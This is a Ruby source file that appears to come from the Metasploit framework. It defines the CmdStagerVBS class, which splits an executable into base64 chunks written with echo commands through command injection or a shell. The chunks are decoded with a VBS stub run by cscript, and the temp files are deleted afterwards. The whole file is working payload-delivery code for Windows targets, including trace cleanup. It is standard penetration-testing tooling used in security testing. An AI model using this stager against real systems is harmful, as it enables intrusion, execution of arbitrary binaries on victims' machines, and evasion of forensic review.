# -*- coding: binary -*-

require 'rex/text'
require 'rex/arch'
require 'msf/core/framework'

module Rex
module Exploitation

###
#
# This class provides the ability to create a sequence of commands from an executable.
# When this sequence is ran via command injection or a shell, the resulting exe will
# be written to disk and executed.
#
# This particular version uses Windows Scripting (VBS) to base64 decode a file,
# created via echo >>, and decode it to the final binary.
#
# Requires: Windows Scripting
# Known Issue: errors with non-ascii-native systems
#
# Written by bannedit
#
###

class CmdStagerVBS < CmdStagerBase

  def initialize(exe)
    super

    @var_decoder = Rex::Text.rand_text_alpha(5)
    @var_encoded = Rex::Text.rand_text_alpha(5)
    @var_decoded = Rex::Text.rand_text_alpha(5)
    @decoder     = nil # filled in later
  end


  #
  # Override just to set the extra byte count
  #
  def generate_cmds(opts)
    # Set the start/end of the commands here (vs initialize) so we have @tempdir
    @cmd_start = "echo "
    @cmd_end   = ">>#{@tempdir}#{@var_encoded}.b64"
    xtra_len = @cmd_start.length + @cmd_end.length + 1
    opts.merge!({ :extra => xtra_len })
    super
  end


  #
  # Simple base64...
  #
  def encode_payload(opts)
    Rex::Text.encode_base64(@exe)
  end


  #
  # Combine the parts of the encoded file with the stuff that goes
  # before / after it.
  #
  def parts_to_commands(parts, opts)

    cmds = []
    parts.each do |p|
      cmd = ''
      cmd << @cmd_start
      cmd << p
      cmd << @cmd_end
      cmds << cmd
    end

    cmds
  end


  #
  # Generate the commands that will decode the file we just created
  #
  def generate_cmds_decoder(opts)

    # Allow decoder stub override (needs to input base64 and output bin)
    @decoder = opts[:decoder] if (opts[:decoder])

    # Read the decoder data file
    f = File.new(@decoder, "rb")
    decoder = f.read(f.stat.size)
    f.close

    # Replace variables
    decoder.gsub!(/decode_stub/, "#{@tempdir}#{@var_decoder}.vbs")
    decoder.gsub!(/ENCODED/, "#{@tempdir}#{@var_encoded}.b64")
    decoder.gsub!(/DECODED/, "#{@tempdir}#{@var_decoded}.exe")

    # Split it apart by the lines
    decoder.split("\n")
  end


  #
  # We override compress commands just to stick in a few extra commands
  # last second..
  #
  def compress_commands(cmds, opts)
    # Make it all happen
    cmds << "cscript //nologo #{@tempdir}#{@var_decoder}.vbs"

    # Clean up after unless requested not to..
    if (not opts[:nodelete])
      cmds << "del #{@tempdir}#{@var_decoder}.vbs"
      cmds << "del #{@tempdir}#{@var_encoded}.b64"
      # NOTE: We won't be able to delete the exe while it's in use.
    end

    super
  end

  # Windows uses & to concat strings
  def cmd_concat_operator
    " & "
  end

end
end
end
